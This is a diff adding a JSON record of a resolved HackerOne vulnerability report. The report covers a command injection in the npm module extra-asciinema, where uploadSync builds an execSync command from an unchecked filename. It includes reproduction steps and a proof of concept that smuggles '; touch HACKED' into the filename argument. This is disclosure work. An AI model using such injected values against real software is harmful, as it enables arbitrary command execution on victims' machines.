@@ -1,0 +1,171 @@
+{
+  "id": 863956,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NjM5NTY=",
+  "url": "https://hackerone.com/reports/863956",
+  "title": "[extra-asciinema] Command Injection via insecure command formatting",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-05-01T11:39:52.991Z",
+  "submitted_at": "2020-05-01T11:39:52.991Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "d3lla",
+    "url": "/d3lla",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-08-22T08:48:20.138Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-22T08:48:20.101Z",
+  "team_member_agreed_on_going_public_at": "2020-08-21T20:51:48.193Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a `Command Injection` issue in the `extra-asciinema` module.\nIt allows to execute arbitrary commands on the victim's PC.\n\n# Module\n\n**module name:** `extra-asciinema`\n**version:** `1.0.5`\n**npm page:** `https://www.npmjs.com/package/extra-asciinema`\n\n## Module Description\n\nasciinema is a terminal screen recorder.\n\nWith this package you can auto-generate terminal recordings for Node.js examples through asciinema programmatically. Each method is also available as separate package for use by bundling tools, like browserify, rollup, uglify-js.\n\n## Module Stats\n\n[23] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue occurs because a user input parameter is used inside a command that is executed without any check. \n\nI tested the `uploadSync` function.\nHere's the code which causes the issue:\n\n```javascript\n// https://github.com/nodef/extra-asciinema/blob/master/index.js#L214\n...\nconst cp9 = require('child_process');\n...\n/**\n * Upload recorded asciicast to asciinema.org site.\n * @param {string} f filename\n * @returns {string} asciicast URL\n */\nfunction uploadSync(f) {\n  var stdout = cp9.execSync(`asciinema upload ${f}`, {encoding: 'utf8'});\n  return stdout.replace(/.*?(https?:\\S+).*/s, '$1');\n}\n...\n```\nThe `f` parameter is used to build the command that is passed to the `child_process.execSync` function without any check.\n\n\n## Steps To Reproduce:\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `extra-asciinema` module:\n    -  `npm i extra-asciinema`\n- create the following PoC JavaScript file (`poc.js`):\n\n```javascript\nconst asciinema = require('extra-asciinema');\nasciinema.uploadSync('; touch HACKED');\n\n```\n- make sure that the `HACKED` file does not exist:\n    - `ls`\n- execute the `poc.js` file:\n    - `node poc.js`\n- the `HACKED` file is created:\n    - `ls`\n    \n{F810853}\n\n\n## Patch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it. \nIn my opinion, it's better to use [`child_process.execFileSync`](https://nodejs.org/api/child_process.html#child_process_child_process_execfilesync_file_args_options) or [`child_process.spawnSync`](https://nodejs.org/api/child_process.html#child_process_child_process_spawnsync_command_args_options) functions instead of `child_process.execSync`.\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v13.13.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nCommand Injection on `extra-asciinema` module via insecure command formatting.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 810853,
+      "file_name": "poc_extra-asciinema.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9dLdPLeEf1vtLDxueNssKeNH?response-content-disposition=attachment%3B%20filename%3D%22poc_extra-asciinema.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_extra-asciinema.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTQYNTCEF%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T133115Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGzYn2V%2FKLFElGHp7MSwu6%2B%2B0lbVNXO4WrfMOZbVXfznAiAkYM0xj48jbWPxmAI8ZCDyISU1EPBmJwkYHszyvXFdEyq7BQie%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMXVzmSDwKr3Jp%2BmE%2BKo8FgBuItxa7r6MIxADxy1EPWozCp94441NLX3owXAxue5vAP26rK2qwPMRhePsdHdYgsvpzK3%2Frc30dUVJMc1mn20RShU6hXy%2FSVKvpLuH2lo6LOe83fW8URMCXZrYMqtXwDEJzEDTu6iHnbaHfVNPjvrxVbe2R9h5U6%2BVpQaMP8cXRyGkjEo6%2BQyER9woHQG6mB4Cu7prNpsaMO6b31thWPQNunVunSN5FL3DazN95Tjv3eByRpVmaUfpRW8vdqCueTtz1c4pXBWGz7FtStJ%2BQg4pWtBuPgmU6b8vbIzpgwg7P39%2BVO6zwPSa4IWGgQsMZarHHma8NJsU3%2F8p9HUNhp%2BpQVwsdcfjRRzRz02GjeO2fCqeDh85IkUrotWnsHFuL4QwzESZnlU7qXMNDBPG%2BFEpZsVvKZFz817SDwMYk6Cvjtv94orWDFf6JQBAqAEd3EEwZifDyv%2FO%2F4NDcUJUQ0y6iq3IH7xSw4JB5dT7hNsC%2Fez15tHqK%2B5DQbRhkQVERbRGVXlz6h1BUdBaMiGi09%2Fk4wkUVjCbOn4PCtRpbs5kGOWsVkwjs9khAh9tCzpfVyqg8onwFp0%2F6jFLN7kmAb99dj58F9Nk1Fb8CiidSxvd0YwPx1YcdNgjp1ka3QrUcYFGXQxJHDt3ZXJHjLPo3peHtRBBAjYhT%2FQ0Siukjxh10Eg%2FvbbpvN2wIjrNlWoF8qA5fFJTZLQqRDmLs8OPtskpq%2BT99sAxZu%2FF6Z1uY6DoA2ZFV4gJOJUfO09bPMrP%2FLMKP62O1fn8EyqJegwZkMAge1Oaj1AleLfBNWWTmDm0yn28Q%2BMqL%2FVeHyP%2Fp%2FIa5AKVPVVJ4Ib6HACoIS1p4VOdJVAA7HlqAPaGAbhS5SjDK2ZXRBjqyAaGhcnLEi2le%2FPTXIrdiREQmvKXS9Yn3RC4Oj1asd9nrOIDPvklUg9EeDX0wCSdNnD5exBz3PhWyfbSG3UtguLoL4raeAFbUukP6PZ6x8TGE%2BNxcqbj6ITf2FuK9WChe%2FlqwX1ZIHKG8Eq7rhELPsRiXY57nfS2vAaeXR68LrE5EMSm7YMH%2FpAmPzc1RYuc8uJ9cW4%2Bd70N4TFLm0D02LwOH2GsHnl9yY%2FWm%2Ffq48eQ3aRA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6026cdf850c6ec2fbc9a326313212602cf7e3eb2864f2b41b5d330382d17eb84",
+      "file_size": 818622,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-09-20T20:51:48.272Z",
+  "allow_singular_disclosure_after": -180203967.15821517,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "crimsonarmour"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "can_manage?": false,
+    "can_export?": false,
+    "can_add_comment?": false,
+    "can_request_decision_review_without_strict_acl_mode?": false,
+    "can_request_decision_review?": false,
+    "can_reject_decision_review?": false,
+    "can_change_state?": false,
+    "can_reopen?": false,
+    "can_award_bounty?": false,
+    "can_award_swag?": false,
+    "can_suggest_bounty_amount?": false,
+    "can_create_dupe_window_bounty?": false,
+    "can_assign_to_user?": false,
+    "can_assign_to_h1_triage?": false,
+    "can_hide_timeline?": false,
+    "can_agree_on_going_public?": false,
+    "can_cancel_disclosure_request?": false,
+    "can_be_publicly_disclosed?": false,
+    "can_post_internal_comments?": false,
+    "can_manage_common_responses?": false,
+    "can_use_common_responses?": false,
+    "can_reassign_to_team?": false,
+    "can_change_title?": false,
+    "can_change_vulnerability_information?": false,
+    "can_change_weakness?": false,
+    "can_be_manually_disclosed?": false,
+    "can_clone?": false,
+    "can_close_as_na?": false,
+    "can_close_as_duplicate?": false,
+    "can_close_as_informative?": false,
+    "can_close_as_spam?": false,
+    "can_close_as_resolved?": false,
+    "can_ban_researcher?": false,
+    "can_create_severity?": false,
+    "can_close_comments?": false,
+    "can_change_structured_scope?": false,
+    "can_manage_collaborators?": false,
+    "can_view_bounty_weights?": false,
+    "can_redact?": false,
+    "can_view_credential_account_details?": false,
+    "can_request_retest?": false,
+    "can_cancel_retest?": false,
+    "can_submit_draft?": false,
+    "can_delete_draft?": false,
+    "can_change_to_pending_program_review_state?": false,
+    "can_request_code_review?": false,
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "can_change_pentest": false,
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
